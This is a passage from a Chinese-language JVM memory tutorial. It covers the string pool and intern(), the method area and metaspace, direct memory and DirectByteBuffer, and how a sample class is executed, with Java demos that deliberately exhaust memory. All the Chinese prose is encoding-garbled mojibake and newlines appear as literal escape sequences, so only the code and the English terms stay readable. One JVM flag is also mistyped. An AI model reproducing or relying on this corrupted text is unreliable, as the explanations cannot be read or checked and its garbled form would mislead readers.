ç±»å½“è°ƒç”¨ Version çš„é™æ€æ–¹æ³•ï¼Œå¯¼è‡´ Version åˆå§‹åŒ–ï¼š\n\n  ```java\n  private static void initializeSystemClass() {\n      sun.misc.Version.init();\n  }\n  ```\n\n* Version ç±»åˆå§‹åŒ–æ—¶éœ€è¦å¯¹é™æ€å¸¸é‡å­—æ®µåˆå§‹åŒ–ï¼Œè¢« launcher_name é™æ€å¸¸é‡å­—æ®µæ‰€å¼•ç”¨çš„ `\"java\"` å­—ç¬¦ä¸²å­—é¢é‡å°±è¢«æ”¾å…¥çš„å­—ç¬¦ä¸²å¸¸é‡æ± ï¼š\n\n  ```java\n  package sun.misc;\n  \n  public class Version {\n      private static final String launcher_name = \"java\";\n      private static final String java_version = \"1.8.0_221\";\n      private static final String java_runtime_name = \"Java(TM) SE Runtime Environment\";\n      private static final String java_profile_name = \"\";\n      private static final String java_runtime_version = \"1.8.0_221-b11\";\n      //...\n  }\n  ```\n\n##### å†…å­˜ä½ç½®\n\nJava 7 ä¹‹å‰ï¼ŒString Pool è¢«æ”¾åœ¨è¿è¡Œæ—¶å¸¸é‡æ± ä¸­ï¼Œå±äºæ°¸ä¹…ä»£ï¼›Java 7 ä»¥åï¼ŒString Pool è¢«ç§»åˆ°å †ä¸­ï¼Œè¿™æ˜¯å› ä¸ºæ°¸ä¹…ä»£çš„ç©ºé—´æœ‰é™ï¼Œåœ¨å¤§é‡ä½¿ç”¨å­—ç¬¦ä¸²çš„åœºæ™¯ä¸‹ä¼šå¯¼è‡´ OutOfMemoryError é”™è¯¯\n\næ¼”ç¤º StringTable ä½ç½®ï¼š\n\n* `-Xmx10m` è®¾ç½®å †å†…å­˜ 10m\n\n* åœ¨ JDK8 ä¸‹è®¾ç½®ï¼š `-Xmx10m -XX:-UseGCOverheadLimit`\n\n* åœ¨ JDK6 ä¸‹è®¾ç½®ï¼š `-XX:MaxPermSize=10m`\n\n  ```java\n  public static void main(String[] args) throws InterruptedException {\n      List<String> list = new ArrayList<String>();\n      int i = 0;\n      try {\n          for (int j = 0; j < 260000; j++) {\n              list.add(String.valueOf(j).intern());\n              i++;\n          }\n      } catch (Throwable e) {\n          e.printStackTrace();\n      } finally {\n          System.out.println(i);\n      }\n  }\n  ```\n\n![](https://img.jwt1399.top/img/202212061628844.png)\n\n***\n\n##### ä¼˜åŒ–å¸¸é‡æ± \n\nä¸¤ç§æ–¹å¼ï¼š\n\n* è°ƒæ•´ -XX:StringTableSize=æ¡¶ä¸ªæ•°ï¼Œæ•°é‡è¶Šå°‘ï¼Œæ€§èƒ½è¶Šå·®\n\n* intern å°†å­—ç¬¦ä¸²å¯¹è±¡æ”¾å…¥å¸¸é‡æ± ï¼Œé€šè¿‡å¤ç”¨å­—ç¬¦ä¸²çš„å¼•ç”¨ï¼Œå‡å°‘å†…å­˜å ç”¨\n\n```java\n/**\n * æ¼”ç¤º intern å‡å°‘å†…å­˜å ç”¨\n * -XX:StringTableSize=200000 -XX:+PrintStringTableStatistics\n * -Xsx500m -Xmx500m -XX:+PrintStringTableStatistics -XX:StringTableSize=200000\n */\npublic class Demo1_25 {\n    public static void main(String[] args) throws IOException {\n        List<String> address = new ArrayList<>();\n        System.in.read();\n        for (int i = 0; i < 10; i++) {\n            //å¾ˆå¤šæ•°æ®\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(\"linux.words\"), \"utf-8\"))) {\n                String line = null;\n                long start = System.nanoTime();\n                while (true) {\n                    line = reader.readLine();\n                    if(line == null) {\n                        break;\n                    }\n                    address.add(line.intern());\n                }\n                System.out.println(\"cost:\" +(System.nanoTime()-start)/1000000);\n            }\n        }\n        System.in.read();\n    }\n}\n```\n\n##### ä¸å¯å˜å¥½å¤„\n\n* å¯ä»¥ç¼“å­˜ hash å€¼ï¼Œä¾‹å¦‚ String ç”¨åš HashMap çš„ keyï¼Œä¸å¯å˜çš„ç‰¹æ€§å¯ä»¥ä½¿å¾— hash å€¼ä¹Ÿä¸å¯å˜ï¼Œåªè¦è¿›è¡Œä¸€æ¬¡è®¡ç®—\n* String Pool çš„éœ€è¦ï¼Œå¦‚æœä¸€ä¸ª String å¯¹è±¡å·²ç»è¢«åˆ›å»ºè¿‡äº†ï¼Œå°±ä¼šä» String Pool ä¸­å–å¾—å¼•ç”¨ï¼Œåªæœ‰ String æ˜¯ä¸å¯å˜çš„ï¼Œæ‰å¯èƒ½ä½¿ç”¨ String Pool\n* å®‰å…¨æ€§ï¼ŒString ç»å¸¸ä½œä¸ºå‚æ•°ï¼ŒString ä¸å¯å˜æ€§å¯ä»¥ä¿è¯å‚æ•°ä¸å¯å˜ã€‚ä¾‹å¦‚åœ¨ä½œä¸ºç½‘ç»œè¿æ¥å‚æ•°çš„æƒ…å†µä¸‹å¦‚æœ String æ˜¯å¯å˜çš„ï¼Œé‚£ä¹ˆåœ¨ç½‘ç»œè¿æ¥è¿‡ç¨‹ä¸­ï¼ŒString è¢«æ”¹å˜ï¼Œæ”¹å˜ String çš„é‚£ä¸€æ–¹ä»¥ä¸ºç°åœ¨è¿æ¥çš„æ˜¯å…¶å®ƒä¸»æœºï¼Œè€Œå®é™…æƒ…å†µå´ä¸ä¸€å®šæ˜¯\n* String ä¸å¯å˜æ€§å¤©ç”Ÿå…·å¤‡çº¿ç¨‹å®‰å…¨ï¼Œå¯ä»¥åœ¨å¤šä¸ªçº¿ç¨‹ä¸­å®‰å…¨åœ°ä½¿ç”¨\n* é˜²æ­¢å­ç±»ç»§æ‰¿ï¼Œç ´å String çš„ API çš„ä½¿ç”¨\n\n### 5.æ–¹æ³•åŒº\n\n> æ–¹æ³•åŒº Method Areaï¼šæ˜¯å„ä¸ª**çº¿ç¨‹å…±äº«**çš„å†…å­˜åŒºåŸŸï¼Œç”¨äºå­˜å‚¨å·²è¢«è™šæ‹ŸæœºåŠ è½½çš„ç±»ä¿¡æ¯ã€å¸¸é‡ã€å³æ—¶ç¼–è¯‘å™¨ç¼–è¯‘åçš„ä»£ç ç­‰æ•°æ®ï¼Œè™½ç„¶ Java è™šæ‹Ÿæœºè§„èŒƒæŠŠæ–¹æ³•åŒºæè¿°ä¸ºå †çš„ä¸€ä¸ªé€»è¾‘éƒ¨åˆ†ï¼Œä½†æ˜¯ä¹Ÿå« Non-Heapï¼ˆéå †ï¼‰\n>\n> Java 1.8 ä»¥å‰ï¼šæ–¹æ³•åŒºç”±**æ°¸ä¹…ä»£**å®ç°\n>\n> Java 1.8 ä¹‹åï¼šæ–¹æ³•åŒºç”±**å…ƒç©ºé—´**å®ç°\n>\n> å¼‚å¸¸ï¼šjava.lang.OutOfMemoryErrorï¼šMetaspace\n\n<img src=\"https://img.jwt1399.top/img/202212051651947.png\" style=\"zoom:50%;\" />\n\næ–¹æ³•åŒºæ„æˆï¼š\n\n- **ç±»å…ƒä¿¡æ¯**ï¼šåœ¨ç±»ç¼–è¯‘æœŸé—´æ”¾å…¥æ–¹æ³•åŒºï¼Œå­˜æ”¾äº†ç±»çš„åŸºæœ¬ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç±»çš„æ–¹æ³•ã€å‚æ•°ã€æ¥å£ä»¥åŠå¸¸é‡æ± è¡¨\n\n- **å¸¸é‡æ± è¡¨**ï¼ˆConstant Pool Tableï¼‰æ˜¯ Class æ–‡ä»¶çš„ä¸€éƒ¨åˆ†ï¼Œå­˜å‚¨äº†**ç±»åœ¨ç¼–è¯‘æœŸé—´ç”Ÿæˆçš„å­—é¢é‡ã€ç¬¦å·å¼•ç”¨**ï¼ŒJVM ä¸ºæ¯ä¸ªå·²åŠ è½½çš„ç±»ç»´æŠ¤ä¸€ä¸ªå¸¸é‡æ± \n\n  - å­—é¢é‡ï¼šåŸºæœ¬æ•°æ®ç±»å‹ã€å­—ç¬¦ä¸²ç±»å‹å¸¸é‡ã€å£°æ˜ä¸º final çš„å¸¸é‡å€¼ç­‰\n\n    - java ä»£ç åœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­æ˜¯æ— æ³•æ„å»ºå¼•ç”¨çš„ï¼Œå­—é¢é‡å°±æ˜¯åœ¨ç¼–è¯‘æ—¶å¯¹äºæ•°æ®çš„ä¸€ç§è¡¨ç¤º\n  \n    - ```java\n      int a = 1;\t\t\t\t//è¿™ä¸ª1ä¾¿æ˜¯å­—é¢é‡\n      String b = \"iloveu\";\t//iloveuä¾¿æ˜¯å­—é¢é‡\n      ```\n  \n  - ç¬¦å·å¼•ç”¨ï¼šç±»ã€å­—æ®µã€æ–¹æ³•ã€æ¥å£ç­‰çš„ç¬¦å·å¼•ç”¨\n  \n    - åœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­å¹¶ä¸çŸ¥é“æ¯ä¸ªç±»çš„åœ°å€ï¼Œå› ä¸ºå¯èƒ½è¿™ä¸ªç±»è¿˜æ²¡æœ‰åŠ è½½ï¼Œå¦‚æœåœ¨ä¸€ä¸ªç±»ä¸­å¼•ç”¨äº†å¦ä¸€ä¸ªç±»ï¼Œæ— æ³•çŸ¥é“å®ƒçš„å†…å­˜åœ°å€ï¼Œåªèƒ½ç”¨å®ƒçš„ç±»åä½œä¸ºç¬¦å·å¼•ç”¨ï¼Œåœ¨ç±»åŠ è½½å®Œåç”¨è¿™ä¸ªç¬¦å·å¼•ç”¨å»è·å–å†…å­˜åœ°å€\n  \n\n\n- **è¿è¡Œæ—¶å¸¸é‡æ± **\n\n  * å¸¸é‡æ± ï¼ˆç¼–è¯‘å™¨ç”Ÿæˆçš„å­—é¢é‡å’Œç¬¦å·å¼•ç”¨ï¼‰ä¸­çš„æ•°æ®ä¼šåœ¨ç±»åŠ è½½çš„åŠ è½½é˜¶æ®µæ”¾å…¥è¿è¡Œæ—¶å¸¸é‡æ± \n\n  * ç±»åœ¨è§£æé˜¶æ®µå°†è¿™äº›ç¬¦å·å¼•ç”¨æ›¿æ¢æˆç›´æ¥å¼•ç”¨\n\n  * é™¤äº†åœ¨ç¼–è¯‘æœŸç”Ÿæˆçš„å¸¸é‡ï¼Œè¿˜å…è®¸åŠ¨æ€ç”Ÿæˆï¼Œä¾‹å¦‚ String ç±»çš„ intern()\n\nç‰¹ç‚¹ï¼š\n\n- æ–¹æ³•åŒºæ˜¯ä¸€ä¸ª JVM è§„èŒƒï¼Œ**æ°¸ä¹…ä»£ä¸å…ƒç©ºé—´éƒ½æ˜¯å…¶ä¸€ç§å®ç°æ–¹å¼**\n\n- æ–¹æ³•åŒºçš„å¤§å°ä¸å¿…æ˜¯å›ºå®šçš„ï¼Œå¯ä»¥åŠ¨æ€æ‰©å±•ï¼ŒåŠ è½½çš„ç±»å¤ªå¤šï¼Œå¯èƒ½å¯¼è‡´æ°¸ä¹…ä»£å†…å­˜æº¢å‡º (OutOfMemoryError)\n- æ–¹æ³•åŒºçš„ GCï¼šé’ˆå¯¹å¸¸é‡æ± çš„å›æ”¶åŠå¯¹ç±»å‹çš„å¸è½½ï¼Œæ¯”è¾ƒéš¾å®ç°\n- ä¸ºäº†**é¿å…æ–¹æ³•åŒºå‡ºç° OOM**ï¼Œåœ¨ JDK8 ä¸­å°†å †å†…çš„æ–¹æ³•åŒºï¼ˆæ°¸ä¹…ä»£ï¼‰ç§»åŠ¨åˆ°äº†æœ¬åœ°å†…å­˜ä¸Šï¼Œé‡æ–°å¼€è¾Ÿäº†ä¸€å—ç©ºé—´ï¼Œå«åšå…ƒç©ºé—´ï¼Œå…ƒç©ºé—´å­˜å‚¨ç±»çš„å…ƒä¿¡æ¯ï¼Œ**é™æ€å˜é‡å’Œå­—ç¬¦ä¸²å¸¸é‡æ± ç­‰æ”¾å…¥å †ä¸­**\n\n\n\n- Java 1.8 ä»¥å‰ï¼šæ°¸ä¹…ä»£å†…å­˜æº¢å‡º java.lang.OutOfMemoryError: PermGen space\n- Java 1.8 ä¹‹åï¼šå…ƒç©ºé—´å†…å­˜æº¢å‡º java.lang.OutOfMemoryError: Metaspace\n\n## â·æœ¬åœ°å†…å­˜\n\n<img src=\"https://img.jwt1399.top/img/202212051652808.png\" style=\"zoom:50%;\" />\n\nJVMå†…å­˜ï¼šJava è™šæ‹Ÿæœºåœ¨æ‰§è¡Œçš„æ—¶å€™ä¼šæŠŠç®¡ç†çš„å†…å­˜åˆ†é…æˆä¸åŒçš„åŒºåŸŸï¼Œå—è™šæ‹Ÿæœºå†…å­˜å¤§å°çš„å‚æ•°æ§åˆ¶ï¼Œå½“å¤§å°è¶…è¿‡å‚æ•°è®¾ç½®çš„å¤§å°æ—¶å°±ä¼šæŠ¥ OOM\n\næœ¬åœ°å†…å­˜ï¼šåˆå«åš**å †å¤–å†…å­˜**ï¼Œçº¿ç¨‹å…±äº«çš„åŒºåŸŸï¼Œæœ¬åœ°å†…å­˜è¿™å—åŒºåŸŸæ˜¯ä¸ä¼šå—åˆ° JVM çš„æ§åˆ¶çš„ï¼Œä¸ä¼šå‘ç”Ÿ GCï¼›å› æ­¤å¯¹äºæ•´ä¸ª Java çš„æ‰§è¡Œæ•ˆç‡æ˜¯æå‡éå¸¸å¤§ï¼Œä½†æ˜¯å¦‚æœå†…å­˜çš„å ç”¨è¶…å‡ºç‰©ç†å†…å­˜çš„å¤§å°ï¼ŒåŒæ ·ä¹Ÿä¼šæŠ¥ OOM\n\n### 1.æ–¹æ³•åŒº/å…ƒç©ºé—´\n\nJava8 å¼€å§‹ PermGen è¢«å…ƒç©ºé—´ä»£æ›¿ï¼Œæ°¸ä¹…ä»£çš„**ç±»ä¿¡æ¯ã€æ–¹æ³•ã€å¸¸é‡æ± **ç­‰éƒ½ç§»åŠ¨åˆ°å…ƒç©ºé—´åŒº\n\nå…ƒç©ºé—´ä¸æ°¸ä¹…ä»£åŒºåˆ«ï¼šå…ƒç©ºé—´ä¸åœ¨è™šæ‹Ÿæœºä¸­ï¼Œä½¿ç”¨çš„æœ¬åœ°å†…å­˜ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œå…ƒç©ºé—´çš„å¤§å°ä»…å—æœ¬åœ°å†…å­˜é™åˆ¶\n\næ–¹æ³•åŒºå†…å­˜æº¢å‡ºï¼š\n\n* JDK1.8 ä»¥å‰ä¼šå¯¼è‡´**æ°¸ä¹…ä»£**å†…å­˜æº¢å‡ºï¼šjava.lang.OutOfMemoryError: PerGen space\n\n  ```sh\n   -XX:MaxPermSize=8m\t\t#å‚æ•°è®¾ç½®\n  ```\n\n* JDK1.8 ä»¥åä¼šå¯¼è‡´**å…ƒç©ºé—´**å†…å­˜æº¢å‡ºï¼šjava.lang.OutOfMemoryError: Metaspace\n\n  ```sh\n  -XX:MaxMetaspaceSize=8m\t#å‚æ•°è®¾ç½®\t\n  ```\n\nå…ƒç©ºé—´å†…å­˜æº¢å‡ºæ¼”ç¤ºï¼š\n\n```java\n/**\n * æ¼”ç¤ºå…ƒç©ºé—´å†…å­˜æº¢å‡º java.lang.OutOfMemoryError: Metaspace\n * -XX:MaxMetaspaceSize=8m\n */\npublic class Demo1_8 extends ClassLoader { // å¯ä»¥ç”¨æ¥åŠ è½½ç±»çš„äºŒè¿›åˆ¶å­—èŠ‚ç \n    public static void main(String[] args) {\n        int j = 0;\n        try {\n            Demo1_8 test = new Demo1_8();\n            for (int i = 0; i < 10000; i++, j++) {\n                // ClassWriter ä½œç”¨æ˜¯ç”Ÿæˆç±»çš„äºŒè¿›åˆ¶å­—èŠ‚ç \n                ClassWriter cw = new ClassWriter(0);\n                // ç‰ˆæœ¬å·ï¼Œ publicï¼Œ ç±»å, åŒ…å, çˆ¶ç±»ï¼Œ æ¥å£\n                cw.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC, \"Class\" + i, null, \"java/lang/Object\", null);\n                // è¿”å› byte[]\n                byte[] code = cw.toByteArray();\n                // æ‰§è¡Œäº†ç±»çš„åŠ è½½\n                test.defineClass(\"Class\" + i, code, 0, code.length); // Class å¯¹è±¡\n            }\n        } finally {\n            System.out.println(j);\n        }\n    }\n}\n```\n\n### 2.ç›´æ¥å†…å­˜\n\nç›´æ¥å†…å­˜æ˜¯ Java å †å¤–ã€ç›´æ¥å‘ç³»ç»Ÿç”³è¯·çš„å†…å­˜åŒºé—´ï¼Œä¸æ˜¯è™šæ‹Ÿæœºè¿è¡Œæ—¶æ•°æ®åŒºçš„ä¸€éƒ¨åˆ†ï¼Œä¹Ÿä¸æ˜¯ã€ŠJava è™šæ‹Ÿæœºè§„èŒƒã€‹ä¸­å®šä¹‰çš„å†…å­˜åŒºåŸŸï¼Œä½†æ˜¯è¿™éƒ¨åˆ†å†…å­˜ä¹Ÿè¢«é¢‘ç¹åœ°ä½¿ç”¨ã€‚è€Œä¸”ä¹Ÿå¯èƒ½å¯¼è‡´ OutOfMemoryError é”™è¯¯å‡ºç°ã€‚\n\n#### æ¦‚è¿°\n\nDirect Memory ä¼˜ç‚¹ï¼š\n\n* Java çš„ NIO åº“å…è®¸ Java ç¨‹åºä½¿ç”¨ç›´æ¥å†…å­˜ï¼Œä½¿ç”¨ native å‡½æ•°ç›´æ¥åˆ†é…å †å¤–å†…å­˜\n* **è¯»å†™æ€§èƒ½é«˜**ï¼Œè¯»å†™é¢‘ç¹çš„åœºåˆå¯èƒ½ä¼šè€ƒè™‘ä½¿ç”¨ç›´æ¥å†…å­˜\n* å¤§å¤§æé«˜ IO æ€§èƒ½ï¼Œé¿å…äº†åœ¨ Java å †å’Œ native å †æ¥å›å¤åˆ¶æ•°æ®\n\nç›´æ¥å†…å­˜ç¼ºç‚¹ï¼š\n\n* ä¸èƒ½ä½¿ç”¨å†…æ ¸ç¼“å†²åŒº Page Cache çš„ç¼“å­˜ä¼˜åŠ¿ï¼Œæ— æ³•ç¼“å­˜æœ€è¿‘è¢«è®¿é—®çš„æ•°æ®å’Œä½¿ç”¨é¢„è¯»åŠŸèƒ½\n* åˆ†é…å›æ”¶æˆæœ¬è¾ƒé«˜ï¼Œä¸å— JVM å†…å­˜å›æ”¶ç®¡ç†\n* å¯èƒ½å¯¼è‡´ OutOfMemoryError å¼‚å¸¸ï¼šOutOfMemoryError: Direct buffer memory\n* å›æ”¶ä¾èµ– System.gc() çš„è°ƒç”¨ï¼Œä½†è¿™ä¸ªè°ƒç”¨ JVM ä¸ä¿è¯æ‰§è¡Œã€ä¹Ÿä¸ä¿è¯ä½•æ—¶æ‰§è¡Œï¼Œè¡Œä¸ºæ˜¯ä¸å¯æ§çš„ã€‚ç¨‹åºä¸€èˆ¬éœ€è¦è‡ªè¡Œç®¡ç†ï¼Œæˆå¯¹å»è°ƒç”¨ mallocã€free\n\nåº”ç”¨åœºæ™¯ï¼š\n\n- ä¼ è¾“å¾ˆå¤§çš„æ•°æ®æ–‡ä»¶ï¼Œæ•°æ®çš„ç”Ÿå‘½å‘¨æœŸå¾ˆé•¿ï¼Œå¯¼è‡´ Page Cache æ²¡æœ‰èµ·åˆ°ç¼“å­˜çš„ä½œç”¨ï¼Œä¸€èˆ¬é‡‡ç”¨ç›´æ¥ IO çš„æ–¹å¼\n- é€‚åˆé¢‘ç¹çš„ IO æ“ä½œï¼Œæ¯”å¦‚ç½‘ç»œå¹¶å‘åœºæ™¯\n\næ•°æ®æµçš„è§’åº¦ï¼š\n\n* éç›´æ¥å†…å­˜çš„ä½œç”¨é“¾ï¼šæœ¬åœ° IO â†’ å†…æ ¸ç¼“å†²åŒºâ†’ ç”¨æˆ·ï¼ˆJVMï¼‰ç¼“å†²åŒº â†’å†…æ ¸ç¼“å†²åŒº â†’ æœ¬åœ° IO\n* ç›´æ¥å†…å­˜çš„ä½œç”¨é“¾ï¼šæœ¬åœ° IO â†’ ç›´æ¥å†…å­˜ â†’ æœ¬åœ° IO\n\n| ç›´æ¥å†…å­˜        | ![](https://img.jwt1399.top/img/202212071545546.png) |\n| --------------- | ---------------------------------------------------- |\n| **éç›´ æ¥å†…å­˜** | ![](https://img.jwt1399.top/img/202212071545613.png) |\n\n#### ByteBuffer\n\n<img src=\"https://img.jwt1399.top/img/202212071605453.png\" style=\"zoom: 50%;\" />\n\nByteBuffer æœ‰ä¸¤ç§ç±»å‹ï¼š\n\n- ä¸€ç§æ˜¯åŸºäºç›´æ¥å†…å­˜ï¼ˆéå †å†…å­˜ï¼‰ï¼šDirectByteBuffer\n- ä¸€ç§æ˜¯éç›´æ¥å†…å­˜ï¼ˆå †å†…å­˜ï¼‰ï¼šHeapByteBuffer\n\n|                  | æè¿°                                                         | ä¼˜ç‚¹                                                         |\n| ---------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| HeapByteBuffer   | åœ¨jvmå †ä¸Šé¢çš„ä¸€ä¸ªbufferï¼Œåº•å±‚çš„æœ¬è´¨æ˜¯ä¸€ä¸ªæ•°ç»„                | ç”±äºå†…å®¹ç»´æŠ¤åœ¨jvmé‡Œï¼Œæ‰€ä»¥æŠŠå†…å®¹å†™è¿›bufferé‡Œé€Ÿåº¦ä¼šå¿«äº›ï¼›å¹¶ä¸”ï¼Œå¯ä»¥æ›´å®¹æ˜“å›æ”¶ |\n| DirectByteBuffer | åº•å±‚çš„æ•°æ®å…¶å®æ˜¯ç»´æŠ¤åœ¨æ“ä½œç³»ç»Ÿçš„å†…å­˜ä¸­ï¼Œè€Œä¸æ˜¯jvmé‡Œï¼ŒDirectByteBufferé‡Œç»´æŠ¤äº†ä¸€ä¸ªå¼•ç”¨addressæŒ‡å‘äº†æ•°æ®ï¼Œä»è€Œæ“ä½œæ•°æ® | è·Ÿå¤–è®¾ï¼ˆIOè®¾å¤‡ï¼‰æ‰“äº¤é“æ—¶ä¼šå¿«å¾ˆå¤šï¼Œå› ä¸ºå¤–è®¾è¯»å–jvmå †é‡Œçš„æ•°æ®æ—¶ï¼Œä¸æ˜¯ç›´æ¥è¯»å–çš„ï¼Œè€Œæ˜¯æŠŠjvmé‡Œçš„æ•°æ®è¯»åˆ°ä¸€ä¸ªå†…å­˜å—é‡Œï¼Œå†åœ¨è¿™ä¸ªå—é‡Œè¯»å–çš„ï¼Œå¦‚æœä½¿ç”¨DirectByteBufferï¼Œåˆ™å¯ä»¥çœå»è¿™ä¸€æ­¥ï¼Œå®ç°zero copy |\n\n#### åˆ†é…å›æ”¶\n\nç›´æ¥å†…å­˜ DirectByteBuffer æºç åˆ†æï¼š\n\n```java\nDirectByteBuffer(int cap) { \n    //....\n    long base = 0;\n    try {\n        // åˆ†é…ç›´æ¥å†…å­˜\n        base = unsafe.allocateMemory(size);\n    }\n    // å†…å­˜èµ‹å€¼\n    unsafe.setMemory(base, size, (byte) 0);\n    if (pa && (base % ps != 0)) {\n        address = base + ps - (base & (ps - 1));\n    } else {\n        address = base;\n    }\n    // åˆ›å»ºå›æ”¶å‡½æ•°\n    cleaner = Cleaner.create(this, new Deallocator(base, size, cap));\n}\nprivate static class Deallocator implements Runnable {\n    public void run() {\n        unsafe.freeMemory(address);// é‡Šæ”¾å†…å­˜\n\t\t//...\n    }\n}\n```\n\n**åˆ†é…å’Œå›æ”¶åŸç†**ï¼š\n\n* ä½¿ç”¨äº† `Unsafe` å¯¹è±¡çš„ `allocateMemory` æ–¹æ³•å®Œæˆ**ç›´æ¥å†…å­˜çš„åˆ†é…**ï¼ŒsetMemory æ–¹æ³•å®Œæˆèµ‹å€¼\n* ByteBuffer çš„å®ç°ç±»å†…éƒ¨ï¼Œä½¿ç”¨äº† Cleanerï¼ˆè™šå¼•ç”¨ï¼‰æ¥ç›‘æµ‹ ByteBuffer å¯¹è±¡ï¼Œä¸€æ—¦ ByteBuffer å¯¹è±¡è¢«åƒåœ¾å›æ”¶ï¼Œé‚£ä¹ˆ ReferenceHandler çº¿ç¨‹é€šè¿‡ Cleaner çš„ clean æ–¹æ³•è°ƒç”¨ Deallocator çš„ runæ–¹æ³•ï¼Œæœ€åé€šè¿‡ `freeMemory` æ¥**é‡Šæ”¾ç›´æ¥å†…å­˜**\n\n\n\n## â¸JVMè¿è¡ŒåŸç†\n\næ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬é€šè¿‡ä¸€ä¸ªæ¡ˆä¾‹æ¥äº†è§£ä¸‹ä»£ç å’Œå¯¹è±¡æ˜¯å¦‚ä½•åˆ†é…å­˜å‚¨çš„ï¼ŒJava ä»£ç åˆæ˜¯å¦‚ä½•åœ¨ JVM ä¸­è¿è¡Œçš„ã€‚\n\n```java\npublic class JVMCase {\n\n  // å¸¸é‡\n  public final static String MAN_SEX_TYPE = \"man\";\n  // é™æ€å˜é‡\n  public static String WOMAN_SEX_TYPE = \"woman\";\n\n  // é™æ€æ–¹æ³•\n  public static void print(Student stu) {\n    System.out.println(\"name: \" + stu.getName() + \"; sex:\" + stu.getSexType() + \"; age:\" + stu.getAge()); \n  }\n  // éé™æ€æ–¹æ³•\n  public void sayHello(Student stu) {\n    System.out.println(stu.getName() + \"say: hello\"); \n  }\n  \n  public static void main(String[] args) {\n    Student stu = new Student();\n    stu.setName(\"nick\");\n    stu.setSexType(MAN_SEX_TYPE);\n    stu.setAge(20);\n    \n    JVMCase jvmcase = new JVMCase();\n    // è°ƒç”¨é™æ€æ–¹æ³•\n    print(stu);\n    // è°ƒç”¨éé™æ€æ–¹æ³•\n    jvmcase.sayHello(stu);\n  }\n\n}\n\n@Data\nclass Student{\n  String name;\n  String sexType;\n  int age;\n}\n```\n\nè¿è¡Œä¸Šé¢ä»£ç æ—¶ï¼ŒJVMçš„æ•´ä¸ªå¤„ç†è¿‡ç¨‹å¦‚ä¸‹ï¼š\n\n- 1.JVM å‘æ“ä½œç³»ç»Ÿ**ç”³è¯·å†…å­˜**ï¼ŒJVM é¦–å…ˆé€šè¿‡é…ç½®å‚æ•°æˆ–è€…é»˜è®¤é…ç½®å‚æ•°å‘æ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜ç©ºé—´ï¼Œæ ¹æ®å†…å­˜å¤§å°æ‰¾åˆ°å…·ä½“çš„å†…å­˜åˆ†é…è¡¨ï¼Œç„¶åæŠŠå†…å­˜æ®µçš„èµ·å§‹åœ°å€å’Œç»ˆæ­¢åœ°å€åˆ†é…ç»™ JVMã€‚\n- 2.JVM è·å¾—å†…å­˜ç©ºé—´åï¼Œå°±**è¿›è¡Œå†…éƒ¨åˆ†é…**ã€‚JVM æ ¹æ®é…ç½®å‚æ•°åˆ†é…å †ã€æ ˆä»¥åŠæ–¹æ³•åŒºçš„å†…å­˜å¤§å°ã€‚\n- 3.**class æ–‡ä»¶åŠ è½½ã€éªŒè¯ã€å‡†å¤‡ä»¥åŠè§£æ**ï¼Œå…¶ä¸­å‡†å¤‡é˜¶æ®µä¼šä¸ºç±»çš„é™æ€å˜é‡åˆ†é…å†…å­˜ï¼Œåˆå§‹åŒ–ä¸ºç³»ç»Ÿçš„åˆå§‹å€¼\n\n<img src=\"https://img.jwt1399.top/img/202212061913505.jpg\" style=\"zoom:50%;\" />\n\n- 4.å®Œæˆä¸Šä¸€ä¸ªæ­¥éª¤åï¼Œå°†ä¼šè¿›è¡Œæœ€åä¸€ä¸ªåˆå§‹åŒ–é˜¶æ®µã€‚åœ¨è¿™ä¸ªé˜¶æ®µä¸­ï¼ŒJVM é¦–å…ˆä¼šæ‰§è¡Œæ„é€ å™¨`<clinit>()`æ–¹æ³•ï¼Œç¼–è¯‘å™¨ä¼šåœ¨.java æ–‡ä»¶è¢«ç¼–è¯‘æˆ.class æ–‡ä»¶æ—¶ï¼Œæ”¶é›†æ‰€æœ‰ç±»çš„åˆå§‹åŒ–ä»£ç ï¼ŒåŒ…æ‹¬é™æ€å˜é‡èµ‹å€¼è¯­å¥ã€é™æ€ä»£ç å—ã€é™æ€æ–¹æ³•ï¼Œæ”¶é›†åœ¨ä¸€èµ·æˆä¸º`<clinit>()`æ–¹æ³•ã€‚\n\n  <img src=\"https://img.jwt1399.top/img/202212061913531.jpg\" style=\"zoom:50%;\" />\n\n- 5.æ‰§è¡Œæ–¹æ³•ã€‚å¯åŠ¨ main çº¿ç¨‹ï¼Œæ‰§è¡Œ main æ–¹æ³•ï¼Œå¼€å§‹æ‰§è¡Œç¬¬ä¸€è¡Œä»£ç ã€‚æ­¤æ—¶å †å†…å­˜ä¸­ä¼šåˆ›å»ºä¸€ä¸ª student å¯¹è±¡ï¼Œå¯¹è±¡å¼•ç”¨ student å°±å­˜æ”¾åœ¨æ ˆä¸­ã€‚<img src=\"https://img.jwt1399.top/img/202212061923027.jpg\" style=\"zoom:50%;\" />\n\n- 6.åˆ›å»ºä¸€ä¸ª JVMCase å¯¹è±¡ï¼Œè°ƒç”¨ sayHello éé™æ€æ–¹æ³•ï¼ŒsayHello æ–¹æ³•å±äºå¯¹è±¡ JVMCaseï¼Œæ­¤æ—¶ sayHello æ–¹æ³•å…¥æ ˆï¼Œå¹¶é€šè¿‡æ ˆä¸­çš„ student å¼•ç”¨è°ƒç”¨å †ä¸­çš„ Student å¯¹è±¡ï¼›ä¹‹åï¼Œè°ƒç”¨é™æ€æ–¹æ³• printï¼Œprint é™æ€æ–¹æ³•å±äº JVMCase ç±»ï¼Œæ˜¯ä»é™æ€æ–¹æ³•ä¸­è·å–ï¼Œä¹‹åæ”¾å…¥åˆ°æ ˆä¸­ï¼Œä¹Ÿé€šè¿‡ student å¼•ç”¨è°ƒç”¨å †ä¸­çš„ student å¯¹è±¡ã€‚\n\n<img src=\"https://img.jwt1399.top/img/202212061923172.jpg\" style=\"zoom:50%;\" />\n\n## â¹æ€»ç»“\n\n### å¼‚å¸¸\n\nå¸¸è§ Out Of Memoryï¼ˆOOMï¼‰ é”™è¯¯ï¼š\n\n* java.lang.StackOverflowError\n  * æ ˆæº¢å‡º\n  * è®¾ç½®æ ˆå†…å­˜å¤§å°ï¼š`-Xss size` \n\n* java.lang.OutOfMemoryErrorï¼šjava heap space\n  * å 